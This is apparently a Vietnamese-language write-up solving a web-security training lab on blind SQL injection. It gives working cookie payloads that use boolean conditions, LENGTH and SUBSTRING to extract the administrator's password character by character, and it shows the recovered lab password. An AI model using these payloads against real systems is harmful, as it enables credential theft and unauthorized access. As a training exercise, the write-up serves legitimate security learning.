# **Lab: Blind SQL injection with conditional responses**

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

>  The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `"Welcome back"` message in the page if the query returns any rows. 

>  The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user. 

 > To solve the lab, log in as the `administrator` user. 

 # **Solution**

 Khi truy cập một trang bất kì, ở đây mình chọn `Lifestyle` sẽ thấy dòng chữ `Welcome back` xuất hiện.

```
https://0abd0040038426c2817a667700da002f.web-security-academy.net/filter?category=Lifestyle
```

Thử gây lỗi syntax trong câu truy vấn SQL:

```
https://0abd0040038426c2817a667700da002f.web-security-academy.net/filter?category=Lifestyle'
```

Sau khi chèn thêm `'` vào tham số bộ lọc qua URL ta thấy không có thông báo hay mã lỗi được trả về. Đồng nghĩa việc sử dụng kỹ thuật UNION attack không hiệu quả.

Sử dụng công cụ Burpsuite để đọc gói tin req và res, ta thấy dòng chữ `Welcome back!` xuất hiện sau khi có giá trị TrackingId được gán trong Cookie.  

Có thể dùng Burpsuite hoặc add-ons cookies-editor để sửa giá trị `TrackingId` nằm trong cookie.

```
Cookie: TrackingId=8C5iKpkhY4rBPaNu; session=PwbaTKBA1qGNIv3fqPoC06HWxBjqiDjl
```

```
Cookie: TrackingId=8C5iKpkhY4rBPaNu' AND '1'='1; session=PwbaTKBA1qGNIv3fqPoC06HWxBjqiDjl
```

```
Cookie: TrackingId=8C5iKpkhY4rBPaNu' AND '1'='2; session=PwbaTKBA1qGNIv3fqPoC06HWxBjqiDjl
```

Giả sử câu truy vấn kiểm tra TrackingId có thể là:

```
SELECT id FROM TRACKED WHERE id=TrackingId ...
```

Vậy nên khi ta thêm một toán tử AND và điều kiện đằng sau thì dòng chữ `Welcome back!` sẽ chỉ xuất hiện khi cả 2 điều kiện đồng thời là `true`.

Ta sẽ thực hiện khai thác từ điều kiện đi kèm vối `TrackingId`.

Ta đã biết được web có một bảng `users` trong đó có 2 cột là `username` và `password`. Mục tiêu là đánh cắp mật khẩu tài khoản có username là `administrator`.

```
Cookie: TrackingId=8C5iKpkhY4rBPaNu' AND LENGTH((SELECT password FROM users WHERE username='administrator'))='20; session=PwbaTKBA1qGNIv3fqPoC06HWxBjqiDjl
```

Trong điều kiện trên, mình dò đoán độ dài mật khẩu tài khoản `administrator` bằng cách so sánh với `'1`. Nếu bằng 1 thì sẽ hiện `Welcome back!`, ngược lại thì sẽ không hiện.

Từ đó ta tăng dần giá trị từ bắt đầu từ 1 tới khi xuất hiện `Welcome back` trong response.

Ta xác định được độ dài mật khẩu tài khoản `administrator` là 20.

Vì chỉ có thể dùng toán tử logic để lấy được đáp án mong muốn nên ta sẽ phải tìm từng kí tự trong mật khẩu tài khoản `administrator`

```
Cookie: TrackingId=8C5iKpkhY4rBPaNu' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a; session=PwbaTKBA1qGNIv3fqPoC06HWxBjqiDjl
```

Sử dụng hàm SUBSTRING để lấy từng kí tự trong password, so sánh với từng kí tự cho tới khi đúng. Thực hiện lặp lại đối với từng vị trí của kí tự trong password rồi ghép lại một mật khẩu chính xác dài 20 kí tự. Ta được:

> qxgbrljincsv16sq984t

DONE~~~

![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShyMxL5MXtUxmsRDnSiWLCIpIiqH9IiAkzSg&s)